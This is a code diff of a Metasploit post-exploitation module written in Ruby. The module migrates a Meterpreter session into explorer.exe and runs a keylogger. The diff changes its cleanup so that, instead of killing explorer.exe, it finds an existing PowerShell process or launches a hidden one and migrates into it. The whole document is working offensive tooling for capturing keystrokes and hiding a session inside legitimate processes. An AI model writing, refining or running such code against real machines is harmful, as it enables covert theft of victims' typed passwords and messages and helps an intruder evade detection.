@@ -22,19 +22,18 @@ class MetasploitModule < Msf::Post
     # Trap SIGINT (Ctrl+C) signal
     trap('INT') { cleanup_and_exit }
 
-    print_status('Attempting to migrate to explorer.exe...')
+    print_status('Migrating to explorer.exe...')
 
     begin
       # Retrieve the process list
       process_list = client.sys.process.get_processes
 
       # Find the PID of the explorer.exe process
-      explorer_proc = process_list.find { |proc| proc['name'] =~ /explorer\.exe/i }
-      explorer_pid = explorer_proc['pid']
+      explorer_pid = process_list.find { |proc| proc['name'] =~ /explorer\.exe/i } ['pid']
 
       # Migrate to explorer.exe process
       client.core.migrate(explorer_pid)
-      print_good("Successfully migrated to explorer.exe (PID: #{explorer_pid})")
+      print_good('Successfully migrated to explorer.exe.')
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error("Failed to migrate to explorer.exe: #{e.message}. Exiting...")
       return
@@ -63,23 +62,47 @@ class MetasploitModule < Msf::Post
     rescue Rex::RuntimeError => e
       print_error("Error occurred: #{e.message}")
     ensure
-      cleanup_and_exit(explorer_proc)
+      cleanup_and_exit
     end
   end
 
-  def cleanup_and_exit(explorer_proc)
+  def cleanup_and_exit
     begin
       # Stop the keyscan capture
       client.ui.keyscan_stop
       print_status('Keylogger stopped.')
 
-      # Kill explorer.exe process
-      print_status('Attempting to kill explorer.exe...')
-      client.sys.process.kill(explorer_proc['pid'])
-      print_good('Successfully killed explorer.exe.')
-    rescue => e
-      print_error("Error during cleanup: #{e.message}")
+      # Retrieve the process list
+      process_list = client.sys.process.get_processes
+
+      # Find the PID of the powershell.exe process
+      powershell_proc = process_list.find { |proc| proc['name'] =~ /powershell\.exe/i }
+      powershell_pid = powershell_proc ? powershell_proc['pid'] : nil
+
+      if powershell_pid.nil?
+        # Create a new powershell.exe process
+        print_status('Creating new powershell.exe process...')
+        powershell_proc = client.sys.process.execute('powershell.exe', nil, {
+          'Hidden' => true,
+          'Channelized' => true
+        })
+        powershell_pid = powershell_proc.pid
+        print_good("Successfully created powershell.exe process with PID #{powershell_pid}.")
+
+        # Migrate to the new powershell.exe process
+        print_status('Migrating to new powershell.exe process...')
+        client.core.migrate(powershell_pid)
+        print_good('Successfully migrated to new powershell.exe process.')
+      else
+
+        # Migrate to the existing powershell.exe process
+        print_good("Found existing powershell.exe process with PID #{powershell_pid}")
+        print_status('Migrating to existing powershell.exe process...')
+        client.core.migrate(powershell_pid)
+        print_good('Successfully migrated to existing powershell.exe process.')
+      end
+    ensure
+      exit
     end
-    exit
   end
 end
